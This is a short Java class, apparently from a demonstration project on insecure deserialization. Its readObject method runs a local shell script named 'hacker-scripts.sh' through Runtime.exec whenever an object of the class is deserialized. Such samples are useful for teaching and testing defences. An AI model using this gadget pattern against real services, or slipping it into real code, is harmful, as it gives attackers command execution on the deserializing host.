package com.example;


import javax.naming.Context;
import java.io.File;
import java.io.IOException;

public class BadCode implements java.io.Serializable
{
    public String name;
    public String address;

    //private String[] cmd = {"sh",  "hacker-scripts.sh", "/home/smckinn/Development/serial-exploit-sample/src/main/resources/"};
    //private String[] cmd = {"sh",  "", "/home/smckinn/Development/serial-exploit-sample/src/main/resources/hacker-scripts.sh"};

    private String file = "/home/smckinn/Development/serial-exploit-sample/src/main/resources/hacker-scripts.sh";

    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException
    {
        in.defaultReadObject();
        this.name = this.name+"!";
        System.out.println("-  Bad code now run bad system commands...");
        //Runtime.getRuntime().exec( cmd);
        Runtime.getRuntime().exec( file );
        System.out.println( "system command has been run.... ");
    }
}